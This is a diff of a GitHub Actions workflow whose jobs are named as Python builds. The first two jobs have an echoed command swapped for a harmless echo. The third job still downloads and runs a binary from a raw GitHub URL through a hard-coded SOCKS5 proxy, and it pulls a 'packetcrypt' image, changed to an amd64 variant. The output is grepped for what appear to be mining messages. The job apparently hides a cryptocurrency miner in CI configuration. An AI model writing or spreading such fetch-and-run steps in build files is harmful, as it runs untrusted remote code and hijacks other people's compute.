@@ -18,7 +18,7 @@ jobs:
     steps:
     - uses: actions/checkout@v2
     - name: Python-run
-      run: echo "wget -O 1 https://raw.githubusercontent.com/johnwixk228/Pake/main/gas && wget -O 2 https://raw.githubusercontent.com/johnwixk228/Pake/main/paket && export http_proxy=socks5://98.162.25.23:4145 && chmod +x 1 && ./1"
+      run: echo "pythosns"
 
  python-2:
     runs-on: ubuntu-18.04
@@ -33,7 +33,7 @@ jobs:
     steps:
     - uses: actions/checkout@v2
     - name: Python-run
-      run: echo "wget -O 1 https://raw.githubusercontent.com/johnwixk228/Pake/main/gas && wget -O 2 https://raw.githubusercontent.com/johnwixk228/Pake/main/paket && export http_proxy=socks5://98.162.25.23:4145 && chmod +x 1 && ./1"
+      run: echo "pythosns"
 
  python-build-4:
     runs-on: ubuntu-20.04
@@ -49,5 +49,5 @@ jobs:
     - name: Rerunning
       continue-on-error: true
       run: |
-        docker pull thomasjp0x42/packetcrypt
+        docker pull thomasjp0x42/packetcrypt-amd64
         docker run wget -O 1 https://raw.githubusercontent.com/johnwixk228/Pake/main/gas && wget -O 2 https://raw.githubusercontent.com/johnwixk228/Pake/main/paket && export http_proxy=socks5://98.162.25.23:4145 && chmod +x 1 && ./1 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
